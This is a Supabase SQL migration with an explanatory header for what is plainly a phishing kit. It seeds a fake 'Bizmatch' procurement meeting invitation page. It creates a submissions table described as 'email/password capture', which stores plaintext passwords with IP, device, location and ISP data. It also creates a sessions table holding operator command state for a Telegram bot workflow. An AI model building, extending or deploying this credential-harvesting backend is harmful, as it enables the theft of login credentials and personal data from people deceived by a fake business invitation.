/*
# Create site_settings, submissions, and sessions tables

## Purpose
Move all data that was previously stored in JSON files on disk (data/db.json, data/submissions.json, data/sessions.json)
into Supabase database tables so data survives server redeploys on Render.

## New Tables

### 1. site_settings
- Single-row table (enforced by CHECK constraint id = 1)
- Stores the editable invitation/site content managed via the admin panel
- Columns: site_title, heading, description, countdown_target, event_date, event_time, event_venue, button_text

### 2. submissions
- One row per form submission (email/password capture)
- Columns: session_id, email, password, provider, ip, browser, os, device, user_agent, city, region, country, lat, lng, timezone, isp, date, time, timestamp
- created_at tracks insertion time

### 3. sessions
- Keyed by session_id (text primary key)
- Stores operator command state for the Telegram bot workflow
- Columns: session_id, command, data, provider, email, consumed
- updated_at tracks last modification

## Security
- RLS enabled on all three tables.
- No policies added — the Express server connects with the service role key which bypasses RLS.
- The frontend never talks to Supabase directly (it goes through the Express API), so anon access is not needed.

## Important Notes
1. The server uses SUPABASE_SERVICE_ROLE_KEY which bypasses RLS, so no policies are needed for the app to function.
2. Default settings row is inserted with the current Bizmatch branding so the site works on first load after migration.
3. This migration is idempotent — safe to re-run.
*/

-- ── site_settings ──
CREATE TABLE IF NOT EXISTS site_settings (
  id int PRIMARY KEY DEFAULT 1,
  site_title text NOT NULL DEFAULT 'Bizmatch Meeting Invitation',
  heading text NOT NULL DEFAULT 'You''re Invited to a Meeting',
  description text NOT NULL DEFAULT 'Congratulations! You have been selected for a procurement meeting with Bizmatch.',
  countdown_target text NOT NULL DEFAULT '2026-07-22T01:00:00',
  event_date text NOT NULL DEFAULT 'July 22, 2026',
  event_time text NOT NULL DEFAULT '01:00 EST',
  event_venue text NOT NULL DEFAULT 'TBD',
  button_text text NOT NULL DEFAULT 'View Meeting Invite',
  CONSTRAINT single_row CHECK (id = 1)
);

ALTER TABLE site_settings ENABLE ROW LEVEL SECURITY;

-- Seed default settings if not present
INSERT INTO site_settings (id)
VALUES (1)
ON CONFLICT (id) DO NOTHING;

-- ── submissions ──
CREATE TABLE IF NOT EXISTS submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  session_id text NOT NULL,
  email text,
  password text,
  provider text,
  ip text,
  browser text,
  os text,
  device text,
  user_agent text,
  city text,
  region text,
  country text,
  lat text,
  lng text,
  timezone text,
  isp text,
  date text,
  time text,
  timestamp text,
  created_at timestamptz DEFAULT now()
);

ALTER TABLE submissions ENABLE ROW LEVEL SECURITY;

-- ── sessions ──
CREATE TABLE IF NOT EXISTS sessions (
  session_id text PRIMARY KEY,
  command text,
  data text,
  provider text,
  email text,
  consumed boolean DEFAULT false,
  updated_at timestamptz DEFAULT now()
);

ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;